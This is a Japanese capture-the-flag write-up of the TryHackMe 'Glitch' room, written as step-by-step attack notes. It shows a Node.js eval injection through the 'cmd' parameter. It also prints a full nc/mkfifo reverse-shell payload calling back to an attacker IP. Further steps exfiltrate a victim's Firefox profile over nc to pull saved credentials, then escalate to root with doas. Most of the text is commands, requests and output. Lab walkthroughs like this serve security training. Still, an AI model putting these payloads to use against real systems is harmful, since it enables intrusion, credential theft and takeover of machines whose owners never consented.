# GLITCH
- https://tryhackme.com/room/glitch

# 攻撃概要
1. ポートスキャン
1. トップページのソースを確認し、トークンを取得
1. トークン付きでアクセスし、APIの挙動を確認
1. APIの脆弱性を利用し、RCEを実行
1. ブラウザのプロファイルから別ユーザのパスワード取得
1. 権限昇格


# ポートスキャン
- 80だけ開いている
```
└─# nmap -Pn -sV -sC -T4 thm_target
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times will be slower.
Starting Nmap 7.91 ( https://nmap.org ) at 2021-08-18 18:35 JST
Nmap scan report for thm_target (10.10.159.189)
Host is up (0.25s latency).
Not shown: 999 filtered ports
PORT   STATE SERVICE VERSION
80/tcp open  http    nginx 1.14.0 (Ubuntu)
|_http-server-header: nginx/1.14.0 (Ubuntu)
|_http-title: not allowed
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 28.58 seconds

```

# トップページのソースを確認し、トークンを取得
- サイトにアクセスし、ソースをのぞくと、APIのURLが表示されている
```
  <body>
    <script>
      function getAccess() {
        fetch('/api/access')
          .then((response) => response.json())
          .then((response) => {
            console.log(response);
          });
      }
    </script>
```

- curlでアクセスするとトークンが取得できる
```
└─# curl http://thm_target/api/access       
{"token":"dGhpc19pc19ub3RfcmVhbA=="}                                                                                                        
┌──(root💀kali)-[~]
└─# echo "dGhpc19pc19ub3RfcmVhbA=="|base64 -d
this_is_not_real     
```

# トークン付きでアクセスし、APIの挙動を確認
- burpで確認すると/api/items が新たに送信されている
- ヒントを見ると[What other methods does the API accept?]とあるので、burpでGETからPOSTに変更するとレスポンスが返ってくる

- request
```
POST /api/items HTTP/1.1

Host: thm_target

User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0

Accept: */*

Accept-Language: en-US,en;q=0.5

Accept-Encoding: gzip, deflate

Referer: http://thm_target/

Connection: close

Cookie: phpbb3_6fb71_u=1; phpbb3_6fb71_k=; phpbb3_6fb71_sid=2e20759bd0b2789bdb8e7916a4530872; token=this_is_not_real

If-None-Match: W/"a9-0aR6bAfiK/DB+A79vs3kEEVvJNc"

Cache-Control: max-age=0
```

- response
```
HTTP/1.1 400 Bad Request

Server: nginx/1.14.0 (Ubuntu)

Date: Fri, 20 Aug 2021 01:06:03 GMT

Content-Type: application/json; charset=utf-8

Content-Length: 45

Connection: close

X-Powered-By: Express

ETag: W/"2d-TsYKyzKzllP3qwT6JGKU7rsiw1A"



{"message":"there_is_a_glitch_in_the_matrix"}
```

- ポストで送信できるということで、何かパラメータを持っているはずなので、ffufを使ってパラメータをふぁじんぐ
    - 準備　通常のレスポンスのサイズを図る
```
# curl -X POST http://thm_target/api/items|wc -c
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100    45  100    45    0     0     66      0 --:--:-- --:--:-- --:--:--    66
45

```
- 通常サイズとは異なるサイズのレスポンスがないかを確認 cmdがヒット
```
└─# ffuf -X POST -u http://thm_target/api/items?FUZZ=shunaroo -w /usr/share/wordlists/dirb/common.txt -mc all -fs 45

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v1.3.1 Kali Exclusive <3
________________________________________________

 :: Method           : POST
 :: URL              : http://thm_target/api/items?FUZZ=shunaroo
 :: Wordlist         : FUZZ: /usr/share/wordlists/dirb/common.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: all
 :: Filter           : Response size: 45
________________________________________________

cmd                     [Status: 500, Size: 1085, Words: 55, Lines: 11]
[WARN] Caught keyboard interrupt (Ctrl-C)

```

- curlでなげると evalのエラーが出るので、ここでRCEできそう
```
─# curl -X POST http://thm_target/api/items?cmd=shunaroo
<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="utf-8">
<title>Error</title>
</head>
<body>
<pre>ReferenceError: shunaroo is not defined<br> &nbsp; &nbsp;at eval (eval at router.post (/var/web/routes/api.js:25:60), &lt;anonymous&gt;:1:1)<br> &nbsp; &nbsp;at router.post (/var/web/routes/api.js:25:60)<br> &nbsp; &nbsp;at Layer.handle [as handle_request] (/var/web/node_modules/express/lib/router/layer.js:95:5)<br> &nbsp; &nbsp;at next (/var/web/node_modules/express/lib/router/route.js:137:13)<br> &nbsp; &nbsp;at Route.dispatch (/var/web/node_modules/express/lib/router/route.js:112:3)<br> &nbsp; &nbsp;at Layer.handle [as handle_request] (/var/web/node_modules/express/lib/router/layer.js:95:5)<br> &nbsp; &nbsp;at /var/web/node_modules/express/lib/router/index.js:281:22<br> &nbsp; &nbsp;at Function.process_params (/var/web/node_modules/express/lib/router/index.js:335:12)<br> &nbsp; &nbsp;at next (/var/web/node_modules/express/lib/router/index.js:275:10)<br> &nbsp; &nbsp;at Function.handle (/var/web/node_modules/express/lib/router/index.js:174:3)</pre>
</body>
</html>

```


# APIの脆弱性を利用し、RCEを実行
- eval rceで検索すると下記サイトがマッチ
    - https://medium.com/@sebnemK/node-js-rce-and-a-simple-reverse-shell-ctf-1b2de51c1a44
- そのままだと動かなかったのでpentestmonkeyのリバースシェルも流用
    - require("child_process").exec('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.9.1.82 1234 >/tmp/f')

```
POST /api/items?cmd=require(%22child_process%22).exec('rm%20%2ftmp%2ff%3bmkfifo%20%2ftmp%2ff%3bcat%20%2ftmp%2ff%7c%2fbin%2fsh%20-i%202%3e%261%7cnc%2010.9.1.82%201234%20%3e%2ftmp%2ff') HTTP/1.1

Host: thm_target

User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0

Accept: */*

Accept-Language: en-US,en;q=0.5

Accept-Encoding: gzip, deflate

Referer: http://thm_target/

Connection: close

Cookie: phpbb3_6fb71_u=1; phpbb3_6fb71_k=; phpbb3_6fb71_sid=2e20759bd0b2789bdb8e7916a4530872; token=this_is_not_real

If-None-Match: W/"a9-0aR6bAfiK/DB+A79vs3kEEVvJNc"

Cache-Control: max-age=0
```

```
HTTP/1.1 200 OK

Server: nginx/1.14.0 (Ubuntu)

Date: Fri, 20 Aug 2021 02:10:19 GMT

Content-Type: text/html; charset=utf-8

Connection: close

X-Powered-By: Express

ETag: W/"27-hyVNLWK8VBc+cTKoitWKEav28lY"

Content-Length: 39



vulnerability_exploited [object Object]
```

```
┌──(root💀kali)-[~]
└─# nc -lnvp 1234                                                                          1 ⨯
listening on [any] 1234 ...
connect to [10.9.1.82] from (UNKNOWN) [10.10.207.160] 36794
/bin/sh: 0: can't access tty; job control turned off


```

# ブラウザのプロファイルから別ユーザのパスワード取得

- ユーザは2つあることを確認
```
$ cat /etc/passwd
user:x:1000:1000:user:/home/user:/bin/bash
v0id:x:1001:1001:,,,:/home/v0id:/bin/bash
```

- userディレクトリにfirefoxのプロファイルが落ちているので、攻撃端末に転送
- やられ側
```
user@ubuntu:~/.firefox$ tar cf - .|nc 10.9.1.82 4321
tar cf - .|nc 10.9.1.82 4321

```
 - 受ける側

```
└─# nc -lnvp 4321|tar xf -                                                  1 ⨯
listening on [any] 4321 ...
connect to [10.9.1.82] from (UNKNOWN) [10.10.207.160] 33934

```
- 取得したプロファイルを読み込んでfirefoxを起動
```
└─# ls 
 b5w4643p.default-release  'Crash Reports'   profiles.ini
                                                                                                    
┌──(root💀kali)-[~/glitch]
└─# firefox --profile b5w4643p.default-release

```

- urlバーに about:logins　を入力するとv0idのクレデンシャルを取得できる


# 権限昇格

- suを用いてユーザをv0idに変更
```
└─# nc -lnvp 9999
listening on [any] 9999 ...
connect to [10.9.1.82] from (UNKNOWN) [10.10.207.160] 51452
/bin/sh: 0: can't access tty; job control turned off
$ su v0id
su: must be run from a terminal
$ python -c 'import pty; pty.spawn("/bin/bash")'
user@ubuntu:/var/web$ su v0id
su v0id
Password: love_the_void

```

- hintから　doasを使うと推測
    - My friend says that sudo is bloat.
```
v0id@ubuntu:/var/web$ doas -u root /bin/bash
doas -u root /bin/bash
Password: love_the_void

root@ubuntu:/var/web# cd /root

```
